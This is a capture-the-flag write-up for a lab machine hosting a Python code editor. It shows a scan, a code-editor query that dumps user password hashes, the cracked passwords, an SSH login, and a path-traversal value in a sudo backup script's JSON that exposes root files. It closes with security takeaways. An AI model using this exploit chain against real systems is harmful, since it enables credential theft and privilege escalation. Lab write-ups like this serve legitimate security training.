Scanning the System  
To begin, we use a tool called Nmap, which helps us check for open ports on  
the target system. This lets us see what services might be running and where  
we can explore further.  
**nmap -A -p- 10.10.11.62**  
Results:  
**PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)  
5000/tcp open http Gunicorn 20.0.4**  
|_http-title: Python Code Editor  
From the results, we can see that port 5000 is running a Python Code Editor.  
This is interesting because it might allow us to run commands on the system.  
If we can execute arbitrary Python code, we might be able to extract sensitive  
information or even take control of the system.  
Exploiting the Python Code Editor  
Since the editor allows us to execute Python scripts, we attempt to extract user  
data from the system’s database using a simple query:  
print([(user.id, user.username, user.password) for user in User.query.all()])  
**We Found These Users:  
(1, ‘development’, ‘759b74ce43947f5f4c91aeddc3e5bad3’)  
(2, ‘martin’, ‘3de6f30c4a09c27fc71932bfc68474be’)**  
These values represent user credentials, but the passwords are hashed. To gain  
access, we need to crack the password hashes. After performing a hash-  
cracking attempt, we successfully retrieve the plaintext passwords:  
development:development  
**martin:nafeelswordsmaster  
Now that we have Martin’s password, we can attempt to log in via SSH:  
ssh martin@10.10.11.62**  
We successfully gain access to the system as martin.  
1  
Escalating Privileges to Gain More Access  
Examining the backy.sh Script  
Once logged in as martin, we begin exploring files that might help us gain  
higher privileges. We find a script located at /usr/bin/backy.sh and inspect  
its contents:  
**cat /usr/bin/backy.sh**  
Key Observations:  
• The script takes a JSON file (task.json) as input to decide what files  
should be backed up.  
• It runs with administrator (sudo) permissions, meaning it has the  
ability to access restricted files.  
• It only allows backing up files from specific folders (/var/ and /home/),  
but we might be able to trick it.  
Modifying task.json to Extract Sensitive Files  
Step 1: Extracting user.txt  
We edit task.json so that the script will back up the user.txt file, which  
might contain sensitive information:  
**{  
“destination”: “/home/martin/”,  
“multiprocessing”: true,  
“verbose_log”: false,  
“directories_to_archive”: [  
“/home/app-production/user.txt”  
],  
“exclude”: [  
“.*”  
]  
}**  
We then execute the script:  
**sudo /usr/bin/backy.sh task.json**  
The script completes successfully, saving the user.txt file. We then extract  
and read it:  
tar -xjf code_home_app-production_user.txt_2025_March.tar.bz2  
cat user.txt  
Inside, we find our user flag.  
2  
**5c89db216f724a2a9a3a329ecc0f3d21**  
Step 2: Extracting root.txt  
Now that we know we can manipulate the backup system, we attempt to retrieve  
root flag from root.txt.  
**We modify task.json again:  
{  
“destination”: “/home/martin/”,  
“multiprocessing”: true,  
“verbose_log”: true,  
“directories_to_archive”: [  
“/var/….//root/”  
]  
}**  
We then execute the script again:  
**sudo /usr/bin/backy.sh task.json**  
This time, it successfully backs up the root.txt file. We extract and view it:  
**tar -xjf code_var_…_root_root.txt_2025_March.tar.bz2**  
cat root.txt  
Now we have access to root privileges, which means we have fully compromised  
the system.  
Final Thoughts & Lessons Learned  
Through this penetration test, we successfully: — Identified an open Python  
Code Editor that allowed us to run commands. — Extracted user creden-  
tials from the system and cracked the passwords. — Gained SSH access as  
martin and explored system files. — Exploited a vulnerable backup script  
to access restricted files. — Retrieved root.txt, proving we gained full con-  
trol of the system.  
Security Takeaways:  
1. Avoid exposing unnecessary services like an open Python Code Edi-  
tor.  
2. Properly secure sensitive scripts that run with sudo privileges.  
3. Use strong password hashing and implement multi-factor authen-  
tication (MFA).  
3  
4. Restrict file permissions to prevent unauthorized users from modifying  
important files.  
By following proper security measures, such vulnerabilities can be mitigated,  
preventing unauthorized access in real-world systems.  
**Pwned!**